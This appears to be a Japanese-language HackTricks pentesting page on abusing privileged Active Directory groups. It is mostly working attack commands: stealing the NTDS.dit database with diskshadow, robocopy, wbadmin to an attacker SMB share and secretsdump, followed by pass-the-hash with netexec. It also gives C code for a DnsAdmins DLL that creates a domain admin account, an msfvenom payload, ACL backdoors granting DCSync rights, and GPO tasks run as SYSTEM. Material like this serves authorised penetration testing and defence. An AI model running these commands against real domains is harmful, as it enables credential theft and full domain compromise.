# Privileged Groups

{{#include ../../banners/hacktricks-training.md}}

## 管理権限を持つ既知のグループ

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

このグループには、ドメイン上で管理者ではないアカウントやグループを作成する権限があります。さらに、Domain Controller (DC) へのローカルログインも可能にします。

このグループのメンバーを特定するには、以下のコマンドを実行します：
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
新しいユーザーの追加が許可されており、DC へのローカルログインも可能です。<sup>[[1]](#references)</sup>

## AdminSDHolder group

**AdminSDHolder** group の Access Control List (ACL) は、high-privilege groups を含む Active Directory 内のすべての「protected groups」に対する permissions を設定するため、極めて重要です。この仕組みにより、unauthorized modifications を防止し、これらの groups の security が確保されます。

attacker は、**AdminSDHolder** group の ACL を変更して、standard user に full permissions を付与することで、これを exploit できます。これにより、その user はすべての protected groups を完全に control できるようになります。この user の permissions が変更または削除された場合でも、system の設計により 1 時間以内に自動的に再付与されます。<sup>[[14]](#references)</sup>

Recent Windows Server documentation でも、複数の built-in operator groups が **protected** objects（`Account Operators`、`Backup Operators`、`Print Operators`、`Server Operators`、`Domain Admins`、`Enterprise Admins`、`Key Admins`、`Enterprise Key Admins` など）として扱われています。**SDProp** process はデフォルトで 60 分ごとに **PDC Emulator** 上で実行され、`adminCount=1` を設定し、protected objects の inheritance を無効化します。これは persistence に役立つほか、protected group から削除されたにもかかわらず、inheritance を無効化する ACL を保持している stale privileged users の hunting にも役立ちます。<sup>[[12]](#references)</sup>

members を確認し、permissions を変更する commands は次のとおりです。
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
Select-Object distinguishedName
```
復元プロセスを迅速化するスクリプトが利用可能です: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1)。

詳細については、[ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)を参照してください。

## AD Recycle Bin

このグループのメンバーシップにより、削除されたActive Directoryオブジェクトを読み取れるため、機密情報が明らかになる可能性があります:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
これは、**過去の権限経路の復元**に役立ちます。削除されたオブジェクトには、`lastKnownParent`、`memberOf`、`sIDHistory`、`adminCount`、古い SPN、または後から別の operator によって復元される可能性がある削除済みの privileged group の DN が残っている場合があります。
```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
-Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```
### Domain Controller Access

DC 上のファイルへのアクセスは、ユーザーが `Server Operators` グループのメンバーでない限り制限されます。このグループに所属すると、アクセスレベルが変わります。

### Privilege Escalation

Sysinternals の `PsService` または `sc` を使用すると、サービスの権限を調査および変更できます。たとえば、`Server Operators` グループは特定のサービスを完全に制御できるため、任意のコマンドを実行して privilege escalation を行えます。<sup>[[1]](#references)</sup>
```cmd
C:\> .\PsService.exe security AppReadiness
```
このコマンドから、`Server Operators` が完全なアクセス権を持ち、サービスを操作して昇格した権限を取得できることが分かります。

## Backup Operators

`Backup Operators` グループのメンバーシップにより、`SeBackup` および `SeRestore` 権限を使用して、`DC01` のファイルシステムにアクセスできます。これらの権限により、明示的な権限がなくても、`FILE_FLAG_BACKUP_SEMANTICS` フラグを使用してフォルダーの移動、一覧表示、ファイルのコピーが可能になります。このプロセスには、特定のスクリプトを使用する必要があります。<sup>[[1]](#references)</sup>

グループメンバーを一覧表示するには、次を実行します：
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Local Attack

これらの privileges をローカルで活用するには、以下の手順を実行します。

1. 必要な libraries を import する：
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. `SeBackupPrivilege` を有効化して確認する：
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. 制限されたディレクトリからファイルにアクセスしてコピーする。例えば：
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD Attack

ドメインコントローラーのファイルシステムへ直接アクセスすると、ドメインユーザーおよびコンピューターのすべての NTLM hash を含む `NTDS.dit` データベースを盗むことができます。

#### diskshadow.exe の使用

1. `C` ドライブのシャドウコピーを作成します：
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. シャドウコピーから `NTDS.dit` をコピーします：
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
または、ファイルのコピーには `robocopy` を使用します:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. ハッシュ取得のために `SYSTEM` と `SAM` を抽出する:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. `NTDS.dit` からすべての hash を取得：
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. 抽出後: Pass-the-Hash による DA<sup>[[11]](#references)</sup>
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### wbadmin.exe の使用

1. 攻撃者マシン上の SMB server 用に NTFS filesystem を設定し、target machine 上に SMB credentials を cache します。
2. `wbadmin.exe` を使用して system backup と `NTDS.dit` extraction を実行します。
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

実践的なデモについては、[DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s) を参照してください。

## DnsAdmins

**DnsAdmins** group の members は、その privileges を悪用して、DNS server 上で SYSTEM privileges により任意の DLL を load できます。DNS server は多くの場合 Domain Controllers 上でホストされているため、この機能には大きな exploitation potential があります。

DnsAdmins group の members を一覧表示するには、次を使用します：
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### 任意の DLL の実行（CVE‑2021‑40469）

> [!NOTE]
> この脆弱性により、DNS service（通常は DC 内）で SYSTEM privileges による任意のコードの実行が可能になります。この問題は 2021 年に修正されました。

メンバーは、次のような commands を使用して、DNS server に任意の DLL（ローカルまたは remote share から）をロードさせることができます：
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
DLLをロードするには、DNSサービスの再起動（追加の権限が必要になる場合があります）が必要です。
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
この攻撃ベクトルの詳細については、ired.teamを参照してください。

#### Mimilib.dll

コマンド実行にmimilib.dllを使用することも可能です。これを変更して、特定のコマンドやreverse shellを実行させます。詳細については[この投稿](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)を確認してください。<sup>[[15]](#references)</sup>

### WPAD Record for MitM

DnsAdminsは、global query block listを無効化した後にWPAD recordを作成することで、DNS recordsを操作してMan-in-the-Middle (MitM) attacksを実行できます。ResponderやInveighなどのToolsを使用して、network trafficのspoofingおよびcaptureを実行できます。

### Event Log Readers
Membersはevent logsにアクセスでき、plaintext passwordsやcommand executionの詳細などのsensitive informationを発見できる可能性があります:
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows Permissions

このグループはドメインオブジェクトの DACLs を変更でき、DCSync privileges を付与できる可能性があります。このグループを悪用した privilege escalation の techniques は、Exchange-AD-Privesc GitHub repo に詳しく記載されています。
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
このグループのメンバーとして行動できる場合、典型的な悪用方法は、攻撃者が制御する principal に [DCSync](dcsync.md) に必要なレプリケーション権限を付与することです。
```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```
Historically、**PrivExchange** は mailbox access、coerced Exchange authentication、LDAP relay を連鎖させ、この同じ primitive に到達していました。この relay path が緩和されている場合でも、`Exchange Windows Permissions` への直接的な membership や Exchange server の control は、domain replication rights へ至る高価値な経路として残ります。

## Hyper-V Administrators

Hyper-V Administrators は Hyper-V への完全な access を持つため、virtualized Domain Controllers の control を取得するために exploit できます。これには live DC の cloning や、NTDS.dit file からの NTLM hashes の extraction が含まれます。

### Exploitation Example

実際の abuse は通常、古い host-level LPE tricks ではなく、**DC disks/checkpoints への offline access** です。Hyper-V host への access があれば、operator は virtualized Domain Controller の checkpoint または export を作成し、VHDX を mount して、guest 内部の LSASS に触れることなく `NTDS.dit`、`SYSTEM`、その他の secrets を extract できます。
```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```
そこから、`Backup Operators` workflowを再利用して、`Windows\NTDS\ntds.dit`とレジストリハイブをオフラインでコピーします。

## Group Policy Creators Owners

このグループのメンバーは、ドメイン内でGroup Policyを作成できます。ただし、メンバーはユーザーやグループにGroup Policyを適用したり、既存のGPOを編集したりすることはできません。

重要な点は、**新しいGPOの作成者がその所有者になり**、通常はその後に編集するための十分な権限を得ることです。つまり、次のいずれかが可能な場合、このグループは注目に値します。

- malicious GPOを作成し、管理者を説得して対象のOUまたはドメインにリンクさせる
- 作成したGPOがすでに有用な場所にリンクされている場合に、それを編集する
- GPOをリンクできる別の委任権限をabuseし、このグループによって編集側の権限を得る

実際のabuseでは通常、SYSVOL-backed policy filesを通じて、**Immediate Task**、**startup script**、**local admin membership**、または**user rights assignment**の変更を追加します。<sup>[[3]](#references)[[4]](#references)[[13]](#references)</sup>
```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```
`SYSVOL` を通じて GPO を手動で編集する場合、変更するだけでは不十分であることに注意してください。`versionNumber`、`GPT.ini`、場合によっては `gPCMachineExtensionNames` も更新する必要があり、更新しないとクライアントはポリシーの更新を無視します。<sup>[[9]](#references)</sup>

## Organization Management

**Microsoft Exchange** がデプロイされている環境では、**Organization Management** と呼ばれる特別なグループが大きな権限を持ちます。このグループには、**ドメイン内のすべてのユーザーのメールボックスへアクセスする**権限があり、**'Microsoft Exchange Security Groups'** Organizational Unit (OU) を**完全に制御**できます。この制御には **`Exchange Windows Permissions`** グループも含まれており、権限昇格に悪用できます。

### Privilege Exploitation and Commands

#### Print Operators

**Print Operators** グループのメンバーには、**`SeLoadDriverPrivilege`** など複数の権限が付与されます。この権限により、**Domain Controller にローカルログオン**し、シャットダウンしたり、プリンターを管理したりできます。これらの権限を悪用するには、特に非昇格コンテキストで **`SeLoadDriverPrivilege`** が表示されない場合、User Account Control (UAC) のバイパスが必要です。<sup>[[1]](#references)</sup>

このグループのメンバーを一覧表示するには、次の PowerShell コマンドを使用します:
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
ドメイン コントローラーでは、デフォルトの Domain Controller Policy により **`SeLoadDriverPrivilege`** が `Print Operators` に付与されるため、このグループは危険です。このグループのメンバーの elevated token を取得できれば、privilege を有効化し、署名済みだが脆弱な driver をロードして kernel/SYSTEM へ移行できます。<sup>[[2]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)</sup> token の処理の詳細については、[Access Tokens](../windows-local-privilege-escalation/access-tokens.md) を確認してください。

#### Remote Desktop Users

このグループのメンバーには、Remote Desktop Protocol (RDP) 経由で PC にアクセスする権限が付与されます。これらのメンバーを列挙するには、PowerShell コマンドを使用できます:
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
RDPのexploitに関するさらなる知見は、専用のpentestingリソースで確認できます。

#### Remote Management Users

このグループのメンバーは、**Windows Remote Management（WinRM）**を使用してPCにアクセスできます。これらのメンバーのEnumerationは、以下によって実行できます：
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
**WinRM** に関連する exploitation techniques については、専用の documentation を参照してください。

#### Server Operators

この group には、backup および restore privileges、system time の変更、system の shutdown など、Domain Controllers 上でさまざまな configuration を実行する permissions があります。<sup>[[1]](#references)</sup> members を enumerate するには、次の command を使用します：
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
ドメインコントローラーでは、`Server Operators` は一般に、**サービスを再構成したり、開始・停止したりする権限**を十分に継承しており、デフォルトの DC ポリシーによって `SeBackupPrivilege`/`SeRestorePrivilege` も付与されます。実際には、これにより **service-control abuse** と **NTDS extraction** の橋渡し役となります：
```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```
サービス ACL によってこのグループに変更/開始権限が与えられている場合は、サービスを任意のコマンドを実行するように設定し、`LocalSystem` として起動してから、元の `binPath` に戻します。サービス制御が制限されている場合は、上記の `Backup Operators` の手法に切り替えて `NTDS.dit` をコピーします。

## 参考文献

- [1] [ired.team – 特権アカウントと Token Privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [2] [Tarlogic – Privilege Escalation のための SeLoadDriverPrivilege の悪用](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [3] [harmj0y – GPO Permissions の悪用](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
- [4] [rastamouse – GPO Abuse - Part 1](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [5] [killswitch-GUI – HotLoad-Driver (ntloaddriver.cpp)](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [6] [tandasat – ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [7] [TarlogicSecurity – EoPLoadDriver (eoploaddriver.cpp)](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [8] [FuzzySecurity – Capcom-Rootkit (Capcom.sys)](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [9] [SpecterOps – GPO と OU に関する Red Teamer's Guide](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [10] [Undocumented NT Internals – NtLoadDriver Function](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
- [11] [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [12] [Microsoft Learn – 付録 C: Active Directory の保護されたアカウントとグループ](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [13] [WithSecure Labs – SharpGPOAbuse](https://labs.withsecure.com/tools/sharpgpoabuse)
- [14] [ired.team – AdminSDHolder を悪用およびバックドア化して Domain Admin の永続化を取得する方法](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
- [15] [Lab of a Penetration Tester – Active Directory における昇格のための DnsAdmins Privilege の悪用](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)

{{#include ../../banners/hacktricks-training.md}}
